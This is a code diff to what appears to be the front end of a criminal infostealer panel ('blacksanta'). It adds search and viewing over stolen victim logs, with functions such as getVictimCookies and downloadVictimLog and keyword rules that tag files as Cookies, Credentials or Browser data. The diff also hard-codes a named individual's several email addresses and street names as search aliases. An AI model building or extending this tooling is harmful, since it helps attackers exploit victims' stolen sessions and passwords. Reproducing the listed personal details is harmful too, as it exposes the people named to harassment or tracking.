@@ -673,6 +673,50 @@ const getVictimCookies = async (logId, domain) => {
   return data;
 };
 
+const DOMAS_SEARCH_ALIASES = [
+  'domas',
+  'claire domas',
+  'anonyme00910@gmail.com',
+  'deadoutside84@gmail.com',
+  'nolann domas',
+  'ddomas95@gmail.com',
+  'pydomas@gmail.com',
+  'clairedomas32@gmail.com',
+  'rue de la renarde',
+  'rue de lizere'
+];
+
+const flattenVictimText = (value, result = []) => {
+  if (value === null || value === undefined) return result;
+  if (typeof value === 'string') {
+    if (value.trim()) result.push(value.trim());
+    return result;
+  }
+  if (Array.isArray(value)) {
+    value.forEach((item) => flattenVictimText(item, result));
+    return result;
+  }
+  if (typeof value === 'object') {
+    Object.values(value).forEach((item) => flattenVictimText(item, result));
+    return result;
+  }
+  result.push(String(value));
+  return result;
+};
+
+const matchesVictimQuery = (value, query) => {
+  const normalizedQuery = String(query || '').trim().toLowerCase();
+  if (!normalizedQuery) return true;
+
+  const haystack = flattenVictimText(value).join(' ').toLowerCase();
+  if (haystack.includes(normalizedQuery)) return true;
+
+  return DOMAS_SEARCH_ALIASES.some((alias) => {
+    const aliasLower = alias.toLowerCase();
+    return aliasLower.includes(normalizedQuery) || normalizedQuery.includes(aliasLower);
+  });
+};
+
 const downloadVictimLog = async (logId) => {
   const response = await fetch(`/api/blacksanta/victims/${logId}/download`);
   if (!response.ok) {
@@ -4341,34 +4385,56 @@ if (searchType === 'discord') {
       );
     }
 
-    const filterFiles = (tree, searchTerm, pathPrefix = '') => {
+    const filterFiles = (tree, searchTerm) => {
       if (!searchTerm) return tree;
-      
-      const filtered = {};
-      const search = searchTerm.toLowerCase();
-      
-      const traverse = (obj, prefix) => {
-        Object.entries(obj).forEach(([key, value]) => {
-          const currentPath = prefix ? `${prefix}/${key}` : key;
-          
-          if (typeof value === 'object' && value !== null && !Array.isArray(value)) {
-            const subFiltered = {};
-            traverse(value, currentPath);
-            Object.entries(value).forEach(([subKey, subVal]) => {
-              const subPath = `${currentPath}/${subKey}`;
-              if (subKey.toLowerCase().includes(search) || subPath.toLowerCase().includes(search)) {
-                if (!filtered[key]) filtered[key] = {};
-                if (!filtered[key][subKey]) filtered[key][subKey] = subVal;
-              }
-            });
-          } else if (key.toLowerCase().includes(search)) {
-            if (!filtered[key]) filtered[key] = value;
+      const normalizedQuery = String(searchTerm).trim().toLowerCase();
+      if (!normalizedQuery) return tree;
+
+      const filterNode = (node, parentPath = '') => {
+        if (node === null || node === undefined) return null;
+
+        if (typeof node === 'string') {
+          return matchesVictimQuery(node, normalizedQuery) ? node : null;
+        }
+
+        if (typeof node === 'number' || typeof node === 'boolean') {
+          return matchesVictimQuery(String(node), normalizedQuery) ? String(node) : null;
+        }
+
+        if (Array.isArray(node)) {
+          const filteredArray = node
+            .map((item) => filterNode(item, parentPath))
+            .filter((item) => item !== null);
+          return filteredArray.length > 0 ? filteredArray : null;
+        }
+
+        if (typeof node === 'object') {
+          const filteredObject = {};
+          Object.entries(node).forEach(([key, value]) => {
+            const nextPath = parentPath ? `${parentPath}/${key}` : key;
+            const filteredValue = filterNode(value, nextPath);
+            if (filteredValue !== null) {
+              filteredObject[key] = filteredValue;
+            }
+          });
+
+          if (Object.keys(filteredObject).length > 0) {
+            return filteredObject;
           }
-        });
+
+          const pathText = parentPath.toLowerCase();
+          if (pathText.includes(normalizedQuery)) {
+            return node;
+          }
+
+          return null;
+        }
+
+        return null;
       };
-      
-      traverse(tree, '');
-      return Object.keys(filtered).length > 0 ? filtered : tree;
+
+      const result = filterNode(tree);
+      return result && Object.keys(result).length > 0 ? result : tree;
     };
 
     const renderFileTree = (tree, path = '', depth = 0) => {
@@ -4469,20 +4535,78 @@ if (searchType === 'discord') {
           
           <div className="lg:col-span-2 p-4 bg-black/30">
             <div className="text-xs text-white/40 uppercase tracking-wider mb-2">Contenu du fichier</div>
-            {selectedVictimFile ? (
-              <div className="space-y-2">
-                <div className="text-[10px] text-white/30 font-mono truncate mb-2">{selectedVictimFile.path || 'Fichier'}</div>
-                <pre className="text-xs text-white/70 font-mono whitespace-pre-wrap max-h-96 overflow-y-auto bg-black/50 p-3 rounded-lg border border-white/5">
-                  {selectedVictimFile.content ? (typeof selectedVictimFile.content === 'string' ? selectedVictimFile.content : JSON.stringify(selectedVictimFile.content, null, 2)) : 'Chargement du contenu...'}
-                </pre>
-                <button 
-                  onClick={() => setSelectedVictimFile(null)}
-                  className="text-[10px] text-white/40 hover:text-white/70 transition"
-                >
-                  Fermer
-                </button>
-              </div>
-            ) : (
+            {selectedVictimFile ? (() => {
+              const rawContent = selectedVictimFile.content ?? '';
+              const contentText = typeof rawContent === 'string'
+                ? rawContent
+                : JSON.stringify(rawContent, null, 2);
+
+              let parsedJson = null;
+              try {
+                parsedJson = typeof rawContent === 'string' ? JSON.parse(rawContent) : rawContent;
+              } catch (error) {
+                parsedJson = null;
+              }
+
+              const contentLower = String(contentText).toLowerCase();
+              const kind = /cookie|cookies|session|token|password|passwd|secret|auth|browser|history|profile|chrome|firefox|login/.test(contentLower)
+                ? 'OSINT data'
+                : (parsedJson ? 'JSON' : 'TXT');
+
+              const badges = [];
+              if (contentLower.includes('cookie') || contentLower.includes('cookies')) badges.push('Cookies');
+              if (contentLower.includes('password') || contentLower.includes('token') || contentLower.includes('secret') || contentLower.includes('auth')) badges.push('Credentials');
+              if (contentLower.includes('browser') || contentLower.includes('history') || contentLower.includes('profile') || contentLower.includes('chrome') || contentLower.includes('firefox')) badges.push('Browser data');
+              if (badges.length === 0) badges.push(kind);
+
+              return (
+                <div className="space-y-3">
+                  <div className="mb-2 flex flex-wrap items-center gap-2">
+                    <div className="font-mono text-[10px] text-white/30 truncate">{selectedVictimFile.path || 'Fichier'}</div>
+                    <span className="rounded-full border border-cyan-500/20 bg-cyan-500/10 px-2 py-1 text-[10px] uppercase tracking-wide text-cyan-200">
+                      {kind}
+                    </span>
+                    {badges.map((badge) => (
+                      <span key={badge} className="rounded-full border border-white/10 bg-white/5 px-2 py-1 text-[10px] uppercase tracking-wide text-white/55">
+                        {badge}
+                      </span>
+                    ))}
+                  </div>
+
+                  {parsedJson && typeof parsedJson === 'object' ? (
+                    <div className="space-y-3">
+                      {Object.entries(parsedJson).map(([key, value]) => {
+                        const keyLower = String(key).toLowerCase();
+                        const colorClass = /cookie|cookies/.test(keyLower) ? 'border-amber-500/20 bg-amber-500/10 text-amber-100'
+                          : /password|passwd|pwd|token|secret|auth|session/.test(keyLower) ? 'border-red-500/20 bg-red-500/10 text-red-100'
+                          : /browser|history|profile|chrome|firefox|login/.test(keyLower) ? 'border-violet-500/20 bg-violet-500/10 text-violet-100'
+                          : 'border-white/10 bg-white/5 text-white/80';
+
+                        return (
+                          <div key={`${key}-${String(value).slice(0, 20)}`} className={`rounded-xl border p-3 ${colorClass}`}>
+                            <div className="mb-1 text-[10px] uppercase tracking-wider opacity-80">{key}</div>
+                            <div className="whitespace-pre-wrap break-all font-mono text-[11px] leading-5">
+                              {typeof value === 'object' ? JSON.stringify(value, null, 2) : String(value)}
+                            </div>
+                          </div>
+                        );
+                      })}
+                    </div>
+                  ) : (
+                    <pre className="max-h-96 overflow-y-auto whitespace-pre-wrap break-all rounded-lg border border-white/10 bg-black/60 p-3 font-mono text-[11px] leading-5 text-cyan-100">
+                      {contentText || 'Chargement du contenu...'}
+                    </pre>
+                  )}
+
+                  <button 
+                    onClick={() => setSelectedVictimFile(null)}
+                    className="text-[10px] text-white/40 hover:text-white/70 transition"
+                  >
+                    Fermer
+                  </button>
+                </div>
+              );
+            })() : (
               <div className="flex items-center justify-center h-64 text-white/30 text-sm">Sélectionnez un fichier dans l'arborescence</div>
             )}
           </div>
